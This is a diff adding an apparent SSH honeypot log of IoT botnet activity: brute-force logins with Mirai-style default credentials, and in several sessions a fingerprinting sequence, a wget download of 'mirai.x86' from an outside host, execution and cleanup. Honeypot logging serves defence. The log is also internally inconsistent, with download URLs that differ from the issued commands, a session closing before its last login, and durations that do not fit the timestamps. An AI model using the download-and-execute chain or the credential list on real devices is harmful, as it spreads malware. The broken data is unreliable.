@@ -1,0 +1,496 @@
+{"eventid":"cowrie.session.connect","session":"bb50b5bab1cd","src_ip":"192.0.2.77","timestamp":"2026-08-12T02:33:48.000Z","sensor":"honeypot","src_port":48989,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"bb50b5bab1cd","src_ip":"192.0.2.77","timestamp":"2026-08-12T02:33:48.120Z","sensor":"honeypot","version":"SSH-2.0-libssh2_1.10.0"}
+{"eventid":"cowrie.login.failed","session":"bb50b5bab1cd","src_ip":"192.0.2.77","timestamp":"2026-08-12T02:33:49.000Z","sensor":"honeypot","username":"admin","password":"1234"}
+{"eventid":"cowrie.login.failed","session":"bb50b5bab1cd","src_ip":"192.0.2.77","timestamp":"2026-08-12T02:33:50.000Z","sensor":"honeypot","username":"ubnt","password":"ubnt"}
+{"eventid":"cowrie.login.failed","session":"bb50b5bab1cd","src_ip":"192.0.2.77","timestamp":"2026-08-12T02:33:51.000Z","sensor":"honeypot","username":"root","password":"pass"}
+{"eventid":"cowrie.session.closed","session":"bb50b5bab1cd","src_ip":"192.0.2.77","timestamp":"2026-08-12T02:34:09.000Z","sensor":"honeypot","duration":18.53}
+{"eventid":"cowrie.session.connect","session":"37f45d685155","src_ip":"203.0.113.44","timestamp":"2026-08-12T04:25:40.000Z","sensor":"honeypot","src_port":42652,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"37f45d685155","src_ip":"203.0.113.44","timestamp":"2026-08-12T04:25:40.120Z","sensor":"honeypot","version":"SSH-2.0-PUTTY"}
+{"eventid":"cowrie.login.failed","session":"37f45d685155","src_ip":"203.0.113.44","timestamp":"2026-08-12T04:25:41.000Z","sensor":"honeypot","username":"root","password":"1111"}
+{"eventid":"cowrie.session.closed","session":"37f45d685155","src_ip":"203.0.113.44","timestamp":"2026-08-12T04:26:04.000Z","sensor":"honeypot","duration":40.14}
+{"eventid":"cowrie.session.connect","session":"9f27ccd1118f","src_ip":"198.51.100.140","timestamp":"2026-08-12T07:17:41.000Z","sensor":"honeypot","src_port":55583,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"9f27ccd1118f","src_ip":"198.51.100.140","timestamp":"2026-08-12T07:17:41.120Z","sensor":"honeypot","version":"SSH-2.0-Go"}
+{"eventid":"cowrie.login.success","session":"9f27ccd1118f","src_ip":"198.51.100.140","timestamp":"2026-08-12T07:17:42.000Z","sensor":"honeypot","username":"admin","password":"admin"}
+{"eventid":"cowrie.login.failed","session":"9f27ccd1118f","src_ip":"198.51.100.140","timestamp":"2026-08-12T07:17:43.000Z","sensor":"honeypot","username":"user","password":"user"}
+{"eventid":"cowrie.login.failed","session":"9f27ccd1118f","src_ip":"198.51.100.140","timestamp":"2026-08-12T07:17:44.000Z","sensor":"honeypot","username":"root","password":"54321"}
+{"eventid":"cowrie.login.failed","session":"9f27ccd1118f","src_ip":"198.51.100.140","timestamp":"2026-08-12T07:17:45.000Z","sensor":"honeypot","username":"root","password":"root"}
+{"eventid":"cowrie.login.failed","session":"9f27ccd1118f","src_ip":"198.51.100.140","timestamp":"2026-08-12T07:17:46.000Z","sensor":"honeypot","username":"admin","password":"password"}
+{"eventid":"cowrie.command.input","session":"9f27ccd1118f","src_ip":"198.51.100.140","timestamp":"2026-08-12T07:17:50.000Z","sensor":"honeypot","input":"/bin/busybox MIRAI"}
+{"eventid":"cowrie.command.input","session":"9f27ccd1118f","src_ip":"198.51.100.140","timestamp":"2026-08-12T07:17:53.000Z","sensor":"honeypot","input":"uname -a"}
+{"eventid":"cowrie.command.input","session":"9f27ccd1118f","src_ip":"198.51.100.140","timestamp":"2026-08-12T07:17:55.000Z","sensor":"honeypot","input":"cat /proc/cpuinfo | grep name | head -n 1"}
+{"eventid":"cowrie.command.input","session":"9f27ccd1118f","src_ip":"198.51.100.140","timestamp":"2026-08-12T07:17:56.000Z","sensor":"honeypot","input":"cat /proc/mounts"}
+{"eventid":"cowrie.command.input","session":"9f27ccd1118f","src_ip":"198.51.100.140","timestamp":"2026-08-12T07:17:57.000Z","sensor":"honeypot","input":"free -m"}
+{"eventid":"cowrie.command.input","session":"9f27ccd1118f","src_ip":"198.51.100.140","timestamp":"2026-08-12T07:17:58.000Z","sensor":"honeypot","input":"wget http://198.51.100.250/bins/mirai.x86 -O /tmp/.x"}
+{"eventid":"cowrie.session.file_download","session":"9f27ccd1118f","src_ip":"198.51.100.140","timestamp":"2026-08-12T07:17:58.800Z","sensor":"honeypot","url":"http://203.0.113.201/a/kaiten.arm7","outfile":"var/lib/cowrie/downloads/9f2e5c8b1a4d7e0c3f6b9a2d5e8c1b4f7a0d3c6e9b2f5a8d1c4e7b0f3a6d9c2e5","shasum":"9f2e5c8b1a4d7e0c3f6b9a2d5e8c1b4f7a0d3c6e9b2f5a8d1c4e7b0f3a6d9c2e5"}
+{"eventid":"cowrie.command.input","session":"9f27ccd1118f","src_ip":"198.51.100.140","timestamp":"2026-08-12T07:17:59.000Z","sensor":"honeypot","input":"chmod +x /tmp/.x"}
+{"eventid":"cowrie.command.input","session":"9f27ccd1118f","src_ip":"198.51.100.140","timestamp":"2026-08-12T07:18:00.000Z","sensor":"honeypot","input":"/tmp/.x"}
+{"eventid":"cowrie.session.closed","session":"9f27ccd1118f","src_ip":"198.51.100.140","timestamp":"2026-08-12T07:18:14.000Z","sensor":"honeypot","duration":10.07}
+{"eventid":"cowrie.session.connect","session":"e7973252b976","src_ip":"192.0.2.15","timestamp":"2026-08-12T10:32:58.000Z","sensor":"honeypot","src_port":53337,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"e7973252b976","src_ip":"192.0.2.15","timestamp":"2026-08-12T10:32:58.120Z","sensor":"honeypot","version":"SSH-2.0-paramiko_2.7.2"}
+{"eventid":"cowrie.login.failed","session":"e7973252b976","src_ip":"192.0.2.15","timestamp":"2026-08-12T10:32:59.000Z","sensor":"honeypot","username":"root","password":"xc3511"}
+{"eventid":"cowrie.login.failed","session":"e7973252b976","src_ip":"192.0.2.15","timestamp":"2026-08-12T10:33:00.000Z","sensor":"honeypot","username":"Administrator","password":"admin"}
+{"eventid":"cowrie.login.failed","session":"e7973252b976","src_ip":"192.0.2.15","timestamp":"2026-08-12T10:33:01.000Z","sensor":"honeypot","username":"admin","password":"password"}
+{"eventid":"cowrie.session.closed","session":"e7973252b976","src_ip":"192.0.2.15","timestamp":"2026-08-12T10:33:27.000Z","sensor":"honeypot","duration":26.39}
+{"eventid":"cowrie.session.connect","session":"17778cb33116","src_ip":"203.0.113.44","timestamp":"2026-08-12T13:54:33.000Z","sensor":"honeypot","src_port":48638,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"17778cb33116","src_ip":"203.0.113.44","timestamp":"2026-08-12T13:54:33.120Z","sensor":"honeypot","version":"SSH-2.0-Go"}
+{"eventid":"cowrie.login.failed","session":"17778cb33116","src_ip":"203.0.113.44","timestamp":"2026-08-12T13:54:34.000Z","sensor":"honeypot","username":"Administrator","password":"admin"}
+{"eventid":"cowrie.login.success","session":"17778cb33116","src_ip":"203.0.113.44","timestamp":"2026-08-12T13:54:35.000Z","sensor":"honeypot","username":"root","password":"root"}
+{"eventid":"cowrie.command.input","session":"17778cb33116","src_ip":"203.0.113.44","timestamp":"2026-08-12T13:54:40.000Z","sensor":"honeypot","input":"/bin/busybox MIRAI"}
+{"eventid":"cowrie.command.input","session":"17778cb33116","src_ip":"203.0.113.44","timestamp":"2026-08-12T13:54:41.000Z","sensor":"honeypot","input":"uname -a"}
+{"eventid":"cowrie.command.input","session":"17778cb33116","src_ip":"203.0.113.44","timestamp":"2026-08-12T13:54:45.000Z","sensor":"honeypot","input":"cat /proc/cpuinfo | grep name | head -n 1"}
+{"eventid":"cowrie.command.input","session":"17778cb33116","src_ip":"203.0.113.44","timestamp":"2026-08-12T13:54:49.000Z","sensor":"honeypot","input":"cat /proc/mounts"}
+{"eventid":"cowrie.command.input","session":"17778cb33116","src_ip":"203.0.113.44","timestamp":"2026-08-12T13:54:50.000Z","sensor":"honeypot","input":"free -m"}
+{"eventid":"cowrie.command.input","session":"17778cb33116","src_ip":"203.0.113.44","timestamp":"2026-08-12T13:54:54.000Z","sensor":"honeypot","input":"wget http://198.51.100.250/bins/mirai.x86 -O /tmp/.x"}
+{"eventid":"cowrie.session.file_download","session":"17778cb33116","src_ip":"203.0.113.44","timestamp":"2026-08-12T13:54:54.800Z","sensor":"honeypot","url":"http://203.0.113.201/a/kaiten.arm7","outfile":"var/lib/cowrie/downloads/9f2e5c8b1a4d7e0c3f6b9a2d5e8c1b4f7a0d3c6e9b2f5a8d1c4e7b0f3a6d9c2e5","shasum":"9f2e5c8b1a4d7e0c3f6b9a2d5e8c1b4f7a0d3c6e9b2f5a8d1c4e7b0f3a6d9c2e5"}
+{"eventid":"cowrie.command.input","session":"17778cb33116","src_ip":"203.0.113.44","timestamp":"2026-08-12T13:54:57.000Z","sensor":"honeypot","input":"chmod +x /tmp/.x"}
+{"eventid":"cowrie.command.input","session":"17778cb33116","src_ip":"203.0.113.44","timestamp":"2026-08-12T13:55:00.000Z","sensor":"honeypot","input":"/tmp/.x"}
+{"eventid":"cowrie.session.closed","session":"17778cb33116","src_ip":"203.0.113.44","timestamp":"2026-08-12T13:55:06.000Z","sensor":"honeypot","duration":32.33}
+{"eventid":"cowrie.session.connect","session":"5719e7545280","src_ip":"198.51.100.23","timestamp":"2026-08-12T15:18:52.000Z","sensor":"honeypot","src_port":6163,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"5719e7545280","src_ip":"198.51.100.23","timestamp":"2026-08-12T15:18:52.120Z","sensor":"honeypot","version":"SSH-2.0-libssh2_1.10.0"}
+{"eventid":"cowrie.login.failed","session":"5719e7545280","src_ip":"198.51.100.23","timestamp":"2026-08-12T15:18:53.000Z","sensor":"honeypot","username":"admin","password":"smcadmin"}
+{"eventid":"cowrie.login.failed","session":"5719e7545280","src_ip":"198.51.100.23","timestamp":"2026-08-12T15:18:54.000Z","sensor":"honeypot","username":"support","password":"support"}
+{"eventid":"cowrie.login.failed","session":"5719e7545280","src_ip":"198.51.100.23","timestamp":"2026-08-12T15:18:55.000Z","sensor":"honeypot","username":"root","password":"vizxv"}
+{"eventid":"cowrie.login.failed","session":"5719e7545280","src_ip":"198.51.100.23","timestamp":"2026-08-12T15:18:56.000Z","sensor":"honeypot","username":"root","password":"888888"}
+{"eventid":"cowrie.session.closed","session":"5719e7545280","src_ip":"198.51.100.23","timestamp":"2026-08-12T15:19:21.000Z","sensor":"honeypot","duration":16.69}
+{"eventid":"cowrie.session.connect","session":"93336e10d8ac","src_ip":"198.51.100.23","timestamp":"2026-08-12T18:31:01.000Z","sensor":"honeypot","src_port":4691,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"93336e10d8ac","src_ip":"198.51.100.23","timestamp":"2026-08-12T18:31:01.120Z","sensor":"honeypot","version":"SSH-2.0-PUTTY"}
+{"eventid":"cowrie.login.failed","session":"93336e10d8ac","src_ip":"198.51.100.23","timestamp":"2026-08-12T18:31:02.000Z","sensor":"honeypot","username":"admin","password":"1234"}
+{"eventid":"cowrie.login.success","session":"93336e10d8ac","src_ip":"198.51.100.23","timestamp":"2026-08-12T18:31:03.000Z","sensor":"honeypot","username":"root","password":"admin"}
+{"eventid":"cowrie.login.failed","session":"93336e10d8ac","src_ip":"198.51.100.23","timestamp":"2026-08-12T18:31:04.000Z","sensor":"honeypot","username":"root","password":"123456"}
+{"eventid":"cowrie.command.input","session":"93336e10d8ac","src_ip":"198.51.100.23","timestamp":"2026-08-12T18:31:09.000Z","sensor":"honeypot","input":"/bin/busybox MIRAI"}
+{"eventid":"cowrie.command.input","session":"93336e10d8ac","src_ip":"198.51.100.23","timestamp":"2026-08-12T18:31:11.000Z","sensor":"honeypot","input":"uname -a"}
+{"eventid":"cowrie.command.input","session":"93336e10d8ac","src_ip":"198.51.100.23","timestamp":"2026-08-12T18:31:13.000Z","sensor":"honeypot","input":"cat /proc/cpuinfo | grep name | head -n 1"}
+{"eventid":"cowrie.command.input","session":"93336e10d8ac","src_ip":"198.51.100.23","timestamp":"2026-08-12T18:31:15.000Z","sensor":"honeypot","input":"cat /proc/mounts"}
+{"eventid":"cowrie.command.input","session":"93336e10d8ac","src_ip":"198.51.100.23","timestamp":"2026-08-12T18:31:19.000Z","sensor":"honeypot","input":"free -m"}
+{"eventid":"cowrie.command.input","session":"93336e10d8ac","src_ip":"198.51.100.23","timestamp":"2026-08-12T18:31:23.000Z","sensor":"honeypot","input":"wget http://198.51.100.250/bins/mirai.x86 -O /tmp/.x"}
+{"eventid":"cowrie.session.file_download","session":"93336e10d8ac","src_ip":"198.51.100.23","timestamp":"2026-08-12T18:31:23.800Z","sensor":"honeypot","url":"http://203.0.113.201/a/kaiten.arm7","outfile":"var/lib/cowrie/downloads/9f2e5c8b1a4d7e0c3f6b9a2d5e8c1b4f7a0d3c6e9b2f5a8d1c4e7b0f3a6d9c2e5","shasum":"9f2e5c8b1a4d7e0c3f6b9a2d5e8c1b4f7a0d3c6e9b2f5a8d1c4e7b0f3a6d9c2e5"}
+{"eventid":"cowrie.command.input","session":"93336e10d8ac","src_ip":"198.51.100.23","timestamp":"2026-08-12T18:31:26.000Z","sensor":"honeypot","input":"chmod +x /tmp/.x"}
+{"eventid":"cowrie.command.input","session":"93336e10d8ac","src_ip":"198.51.100.23","timestamp":"2026-08-12T18:31:28.000Z","sensor":"honeypot","input":"/tmp/.x"}
+{"eventid":"cowrie.command.input","session":"93336e10d8ac","src_ip":"198.51.100.23","timestamp":"2026-08-12T18:31:30.000Z","sensor":"honeypot","input":"rm -rf /tmp/.x"}
+{"eventid":"cowrie.session.closed","session":"93336e10d8ac","src_ip":"198.51.100.23","timestamp":"2026-08-12T18:31:53.000Z","sensor":"honeypot","duration":18.59}
+{"eventid":"cowrie.session.connect","session":"d5c6edf86d30","src_ip":"203.0.113.44","timestamp":"2026-08-12T19:15:15.000Z","sensor":"honeypot","src_port":31774,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"d5c6edf86d30","src_ip":"203.0.113.44","timestamp":"2026-08-12T19:15:15.120Z","sensor":"honeypot","version":"SSH-2.0-paramiko_2.7.2"}
+{"eventid":"cowrie.login.failed","session":"d5c6edf86d30","src_ip":"203.0.113.44","timestamp":"2026-08-12T19:15:16.000Z","sensor":"honeypot","username":"ubnt","password":"ubnt"}
+{"eventid":"cowrie.login.failed","session":"d5c6edf86d30","src_ip":"203.0.113.44","timestamp":"2026-08-12T19:15:17.000Z","sensor":"honeypot","username":"admin","password":"password"}
+{"eventid":"cowrie.login.failed","session":"d5c6edf86d30","src_ip":"203.0.113.44","timestamp":"2026-08-12T19:15:18.000Z","sensor":"honeypot","username":"root","password":"vizxv"}
+{"eventid":"cowrie.login.failed","session":"d5c6edf86d30","src_ip":"203.0.113.44","timestamp":"2026-08-12T19:15:19.000Z","sensor":"honeypot","username":"root","password":"xc3511"}
+{"eventid":"cowrie.login.failed","session":"d5c6edf86d30","src_ip":"203.0.113.44","timestamp":"2026-08-12T19:15:20.000Z","sensor":"honeypot","username":"admin","password":"smcadmin"}
+{"eventid":"cowrie.login.failed","session":"d5c6edf86d30","src_ip":"203.0.113.44","timestamp":"2026-08-12T19:15:21.000Z","sensor":"honeypot","username":"root","password":"123456"}
+{"eventid":"cowrie.session.closed","session":"d5c6edf86d30","src_ip":"203.0.113.44","timestamp":"2026-08-12T19:15:44.000Z","sensor":"honeypot","duration":14.85}
+{"eventid":"cowrie.session.connect","session":"733f5bd36272","src_ip":"192.0.2.77","timestamp":"2026-08-12T20:37:12.000Z","sensor":"honeypot","src_port":29864,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"733f5bd36272","src_ip":"192.0.2.77","timestamp":"2026-08-12T20:37:12.120Z","sensor":"honeypot","version":"SSH-2.0-paramiko_2.7.2"}
+{"eventid":"cowrie.login.failed","session":"733f5bd36272","src_ip":"192.0.2.77","timestamp":"2026-08-12T20:37:13.000Z","sensor":"honeypot","username":"ubnt","password":"ubnt"}
+{"eventid":"cowrie.login.failed","session":"733f5bd36272","src_ip":"192.0.2.77","timestamp":"2026-08-12T20:37:14.000Z","sensor":"honeypot","username":"admin","password":"1234"}
+{"eventid":"cowrie.login.failed","session":"733f5bd36272","src_ip":"192.0.2.77","timestamp":"2026-08-12T20:37:15.000Z","sensor":"honeypot","username":"root","password":"888888"}
+{"eventid":"cowrie.login.failed","session":"733f5bd36272","src_ip":"192.0.2.77","timestamp":"2026-08-12T20:37:16.000Z","sensor":"honeypot","username":"Administrator","password":"admin"}
+{"eventid":"cowrie.session.closed","session":"733f5bd36272","src_ip":"192.0.2.77","timestamp":"2026-08-12T20:37:31.000Z","sensor":"honeypot","duration":34.67}
+{"eventid":"cowrie.session.connect","session":"2bf2b556ec05","src_ip":"203.0.113.44","timestamp":"2026-08-12T22:37:56.000Z","sensor":"honeypot","src_port":1212,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"2bf2b556ec05","src_ip":"203.0.113.44","timestamp":"2026-08-12T22:37:56.120Z","sensor":"honeypot","version":"SSH-2.0-Go"}
+{"eventid":"cowrie.login.failed","session":"2bf2b556ec05","src_ip":"203.0.113.44","timestamp":"2026-08-12T22:37:57.000Z","sensor":"honeypot","username":"support","password":"support"}
+{"eventid":"cowrie.session.closed","session":"2bf2b556ec05","src_ip":"203.0.113.44","timestamp":"2026-08-12T22:38:29.000Z","sensor":"honeypot","duration":24.43}
+{"eventid":"cowrie.session.connect","session":"4771ff195e1b","src_ip":"198.51.100.140","timestamp":"2026-08-12T22:50:50.000Z","sensor":"honeypot","src_port":62840,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"4771ff195e1b","src_ip":"198.51.100.140","timestamp":"2026-08-12T22:50:50.120Z","sensor":"honeypot","version":"SSH-2.0-paramiko_2.7.2"}
+{"eventid":"cowrie.login.failed","session":"4771ff195e1b","src_ip":"198.51.100.140","timestamp":"2026-08-12T22:50:51.000Z","sensor":"honeypot","username":"admin","password":"1234"}
+{"eventid":"cowrie.login.failed","session":"4771ff195e1b","src_ip":"198.51.100.140","timestamp":"2026-08-12T22:50:52.000Z","sensor":"honeypot","username":"root","password":"123456"}
+{"eventid":"cowrie.login.failed","session":"4771ff195e1b","src_ip":"198.51.100.140","timestamp":"2026-08-12T22:50:53.000Z","sensor":"honeypot","username":"ubnt","password":"ubnt"}
+{"eventid":"cowrie.login.failed","session":"4771ff195e1b","src_ip":"198.51.100.140","timestamp":"2026-08-12T22:50:54.000Z","sensor":"honeypot","username":"user","password":"user"}
+{"eventid":"cowrie.login.success","session":"4771ff195e1b","src_ip":"198.51.100.140","timestamp":"2026-08-12T22:50:55.000Z","sensor":"honeypot","username":"admin","password":"admin"}
+{"eventid":"cowrie.command.input","session":"4771ff195e1b","src_ip":"198.51.100.140","timestamp":"2026-08-12T22:50:56.000Z","sensor":"honeypot","input":"/bin/busybox MIRAI"}
+{"eventid":"cowrie.command.input","session":"4771ff195e1b","src_ip":"198.51.100.140","timestamp":"2026-08-12T22:51:00.000Z","sensor":"honeypot","input":"uname -a"}
+{"eventid":"cowrie.command.input","session":"4771ff195e1b","src_ip":"198.51.100.140","timestamp":"2026-08-12T22:51:02.000Z","sensor":"honeypot","input":"cat /proc/cpuinfo | grep name | head -n 1"}
+{"eventid":"cowrie.command.input","session":"4771ff195e1b","src_ip":"198.51.100.140","timestamp":"2026-08-12T22:51:05.000Z","sensor":"honeypot","input":"cat /proc/mounts"}
+{"eventid":"cowrie.command.input","session":"4771ff195e1b","src_ip":"198.51.100.140","timestamp":"2026-08-12T22:51:08.000Z","sensor":"honeypot","input":"free -m"}
+{"eventid":"cowrie.command.input","session":"4771ff195e1b","src_ip":"198.51.100.140","timestamp":"2026-08-12T22:51:11.000Z","sensor":"honeypot","input":"wget http://198.51.100.250/bins/mirai.x86 -O /tmp/.x"}
+{"eventid":"cowrie.session.file_download","session":"4771ff195e1b","src_ip":"198.51.100.140","timestamp":"2026-08-12T22:51:11.800Z","sensor":"honeypot","url":"http://198.51.100.250/bins/mirai.x86","outfile":"var/lib/cowrie/downloads/3b1c6f2e9a7d4b8c1e5f0a2d6c9b3e7f4a1d8c2b5e0f9a6d3c7b1e4f8a2d5c0b9","shasum":"3b1c6f2e9a7d4b8c1e5f0a2d6c9b3e7f4a1d8c2b5e0f9a6d3c7b1e4f8a2d5c0b9"}
+{"eventid":"cowrie.session.closed","session":"4771ff195e1b","src_ip":"198.51.100.140","timestamp":"2026-08-12T22:51:22.000Z","sensor":"honeypot","duration":23.5}
+{"eventid":"cowrie.session.connect","session":"97af7f0b4c55","src_ip":"198.51.100.23","timestamp":"2026-08-12T22:58:20.000Z","sensor":"honeypot","src_port":10732,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"97af7f0b4c55","src_ip":"198.51.100.23","timestamp":"2026-08-12T22:58:20.120Z","sensor":"honeypot","version":"SSH-2.0-PUTTY"}
+{"eventid":"cowrie.login.failed","session":"97af7f0b4c55","src_ip":"198.51.100.23","timestamp":"2026-08-12T22:58:21.000Z","sensor":"honeypot","username":"ubnt","password":"ubnt"}
+{"eventid":"cowrie.session.closed","session":"97af7f0b4c55","src_ip":"198.51.100.23","timestamp":"2026-08-12T22:58:53.000Z","sensor":"honeypot","duration":41.98}
+{"eventid":"cowrie.session.connect","session":"531c315baf27","src_ip":"198.51.100.23","timestamp":"2026-08-13T00:02:08.000Z","sensor":"honeypot","src_port":15626,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"531c315baf27","src_ip":"198.51.100.23","timestamp":"2026-08-13T00:02:08.120Z","sensor":"honeypot","version":"SSH-2.0-libssh2_1.9.0"}
+{"eventid":"cowrie.login.failed","session":"531c315baf27","src_ip":"198.51.100.23","timestamp":"2026-08-13T00:02:09.000Z","sensor":"honeypot","username":"ubnt","password":"ubnt"}
+{"eventid":"cowrie.login.failed","session":"531c315baf27","src_ip":"198.51.100.23","timestamp":"2026-08-13T00:02:10.000Z","sensor":"honeypot","username":"user","password":"user"}
+{"eventid":"cowrie.login.failed","session":"531c315baf27","src_ip":"198.51.100.23","timestamp":"2026-08-13T00:02:11.000Z","sensor":"honeypot","username":"pi","password":"raspberry"}
+{"eventid":"cowrie.login.failed","session":"531c315baf27","src_ip":"198.51.100.23","timestamp":"2026-08-13T00:02:12.000Z","sensor":"honeypot","username":"admin","password":"1234"}
+{"eventid":"cowrie.login.failed","session":"531c315baf27","src_ip":"198.51.100.23","timestamp":"2026-08-13T00:02:13.000Z","sensor":"honeypot","username":"root","password":"12345"}
+{"eventid":"cowrie.login.failed","session":"531c315baf27","src_ip":"198.51.100.23","timestamp":"2026-08-13T00:02:14.000Z","sensor":"honeypot","username":"admin","password":"password"}
+{"eventid":"cowrie.session.closed","session":"531c315baf27","src_ip":"198.51.100.23","timestamp":"2026-08-13T00:02:11.000Z","sensor":"honeypot","duration":31.57}
+{"eventid":"cowrie.session.connect","session":"298f2b7e9608","src_ip":"192.0.2.200","timestamp":"2026-08-13T03:08:08.000Z","sensor":"honeypot","src_port":60504,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"298f2b7e9608","src_ip":"192.0.2.200","timestamp":"2026-08-13T03:08:08.120Z","sensor":"honeypot","version":"SSH-2.0-Go"}
+{"eventid":"cowrie.login.failed","session":"298f2b7e9608","src_ip":"192.0.2.200","timestamp":"2026-08-13T03:08:09.000Z","sensor":"honeypot","username":"root","password":"1234"}
+{"eventid":"cowrie.login.failed","session":"298f2b7e9608","src_ip":"192.0.2.200","timestamp":"2026-08-13T03:08:10.000Z","sensor":"honeypot","username":"root","password":"123456"}
+{"eventid":"cowrie.login.success","session":"298f2b7e9608","src_ip":"192.0.2.200","timestamp":"2026-08-13T03:08:11.000Z","sensor":"honeypot","username":"root","password":"root"}
+{"eventid":"cowrie.login.failed","session":"298f2b7e9608","src_ip":"192.0.2.200","timestamp":"2026-08-13T03:08:12.000Z","sensor":"honeypot","username":"pi","password":"raspberry"}
+{"eventid":"cowrie.login.failed","session":"298f2b7e9608","src_ip":"192.0.2.200","timestamp":"2026-08-13T03:08:13.000Z","sensor":"honeypot","username":"admin","password":"admin"}
+{"eventid":"cowrie.login.failed","session":"298f2b7e9608","src_ip":"192.0.2.200","timestamp":"2026-08-13T03:08:14.000Z","sensor":"honeypot","username":"root","password":"admin"}
+{"eventid":"cowrie.command.input","session":"298f2b7e9608","src_ip":"192.0.2.200","timestamp":"2026-08-13T03:08:17.000Z","sensor":"honeypot","input":"/bin/busybox MIRAI"}
+{"eventid":"cowrie.command.input","session":"298f2b7e9608","src_ip":"192.0.2.200","timestamp":"2026-08-13T03:08:19.000Z","sensor":"honeypot","input":"uname -a"}
+{"eventid":"cowrie.command.input","session":"298f2b7e9608","src_ip":"192.0.2.200","timestamp":"2026-08-13T03:08:20.000Z","sensor":"honeypot","input":"cat /proc/cpuinfo | grep name | head -n 1"}
+{"eventid":"cowrie.command.input","session":"298f2b7e9608","src_ip":"192.0.2.200","timestamp":"2026-08-13T03:08:24.000Z","sensor":"honeypot","input":"cat /proc/mounts"}
+{"eventid":"cowrie.command.input","session":"298f2b7e9608","src_ip":"192.0.2.200","timestamp":"2026-08-13T03:08:26.000Z","sensor":"honeypot","input":"free -m"}
+{"eventid":"cowrie.command.input","session":"298f2b7e9608","src_ip":"192.0.2.200","timestamp":"2026-08-13T03:08:30.000Z","sensor":"honeypot","input":"wget http://198.51.100.250/bins/mirai.x86 -O /tmp/.x"}
+{"eventid":"cowrie.session.file_download","session":"298f2b7e9608","src_ip":"192.0.2.200","timestamp":"2026-08-13T03:08:30.800Z","sensor":"honeypot","url":"http://203.0.113.201/a/kaiten.arm7","outfile":"var/lib/cowrie/downloads/9f2e5c8b1a4d7e0c3f6b9a2d5e8c1b4f7a0d3c6e9b2f5a8d1c4e7b0f3a6d9c2e5","shasum":"9f2e5c8b1a4d7e0c3f6b9a2d5e8c1b4f7a0d3c6e9b2f5a8d1c4e7b0f3a6d9c2e5"}
+{"eventid":"cowrie.command.input","session":"298f2b7e9608","src_ip":"192.0.2.200","timestamp":"2026-08-13T03:08:34.000Z","sensor":"honeypot","input":"chmod +x /tmp/.x"}
+{"eventid":"cowrie.command.input","session":"298f2b7e9608","src_ip":"192.0.2.200","timestamp":"2026-08-13T03:08:38.000Z","sensor":"honeypot","input":"/tmp/.x"}
+{"eventid":"cowrie.command.input","session":"298f2b7e9608","src_ip":"192.0.2.200","timestamp":"2026-08-13T03:08:40.000Z","sensor":"honeypot","input":"rm -rf /tmp/.x"}
+{"eventid":"cowrie.session.closed","session":"298f2b7e9608","src_ip":"192.0.2.200","timestamp":"2026-08-13T03:08:46.000Z","sensor":"honeypot","duration":4.71}
+{"eventid":"cowrie.session.connect","session":"8bc95c643f10","src_ip":"203.0.113.9","timestamp":"2026-08-13T05:40:04.000Z","sensor":"honeypot","src_port":2838,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"8bc95c643f10","src_ip":"203.0.113.9","timestamp":"2026-08-13T05:40:04.120Z","sensor":"honeypot","version":"SSH-2.0-libssh2_1.9.0"}
+{"eventid":"cowrie.login.failed","session":"8bc95c643f10","src_ip":"203.0.113.9","timestamp":"2026-08-13T05:40:05.000Z","sensor":"honeypot","username":"root","password":"54321"}
+{"eventid":"cowrie.login.failed","session":"8bc95c643f10","src_ip":"203.0.113.9","timestamp":"2026-08-13T05:40:06.000Z","sensor":"honeypot","username":"root","password":"vizxv"}
+{"eventid":"cowrie.login.failed","session":"8bc95c643f10","src_ip":"203.0.113.9","timestamp":"2026-08-13T05:40:07.000Z","sensor":"honeypot","username":"admin","password":"smcadmin"}
+{"eventid":"cowrie.login.failed","session":"8bc95c643f10","src_ip":"203.0.113.9","timestamp":"2026-08-13T05:40:08.000Z","sensor":"honeypot","username":"root","password":"1234"}
+{"eventid":"cowrie.login.success","session":"8bc95c643f10","src_ip":"203.0.113.9","timestamp":"2026-08-13T05:40:09.000Z","sensor":"honeypot","username":"admin","password":"admin"}
+{"eventid":"cowrie.login.failed","session":"8bc95c643f10","src_ip":"203.0.113.9","timestamp":"2026-08-13T05:40:10.000Z","sensor":"honeypot","username":"admin","password":"1234"}
+{"eventid":"cowrie.session.closed","session":"8bc95c643f10","src_ip":"203.0.113.9","timestamp":"2026-08-13T05:40:39.000Z","sensor":"honeypot","duration":25.95}
+{"eventid":"cowrie.session.connect","session":"0399eb28e3b1","src_ip":"192.0.2.15","timestamp":"2026-08-13T09:19:58.000Z","sensor":"honeypot","src_port":28177,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"0399eb28e3b1","src_ip":"192.0.2.15","timestamp":"2026-08-13T09:19:58.120Z","sensor":"honeypot","version":"SSH-2.0-Go"}
+{"eventid":"cowrie.login.failed","session":"0399eb28e3b1","src_ip":"192.0.2.15","timestamp":"2026-08-13T09:19:59.000Z","sensor":"honeypot","username":"root","password":"pass"}
+{"eventid":"cowrie.login.failed","session":"0399eb28e3b1","src_ip":"192.0.2.15","timestamp":"2026-08-13T09:20:00.000Z","sensor":"honeypot","username":"root","password":"vizxv"}
+{"eventid":"cowrie.login.failed","session":"0399eb28e3b1","src_ip":"192.0.2.15","timestamp":"2026-08-13T09:20:01.000Z","sensor":"honeypot","username":"root","password":"1234"}
